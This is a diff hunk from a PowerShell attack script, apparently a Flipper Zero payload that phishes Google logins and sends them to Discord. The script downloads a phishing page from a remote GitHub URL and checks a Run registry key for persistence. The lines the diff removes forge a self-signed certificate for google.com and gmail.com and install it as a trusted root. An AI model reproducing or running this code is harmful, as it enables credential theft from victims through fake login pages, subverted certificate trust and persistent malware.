@@ -41,15 +41,6 @@ function Handle-Request{
 
 if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
     Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;
-
-    $dnsNames = "localhost", "google.com", "*.google.com", "gmail.com";
-    $cert = New-SelfSignedCertificate -DnsName $dnsNames -CertStoreLocation "cert:\LocalMachine\My" -KeySpec Signature -HashAlgorithm SHA256 -KeyExportPolicy Exportable  -NotAfter (Get-Date).AddYears(20)
-
-    $thumbprint = $cert.Thumbprint
-    Export-Certificate -Cert "cert:\localmachine\my\$thumbprint" -FilePath "$env:temp\gph.cer" -Force
-
-    Import-Certificate -filePath "$env:temp\gph.cer" -CertStoreLocation "cert:\LocalMachine\Root"
-    Write-Output $thumbprint
 }
 
 if(-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\gph")){    
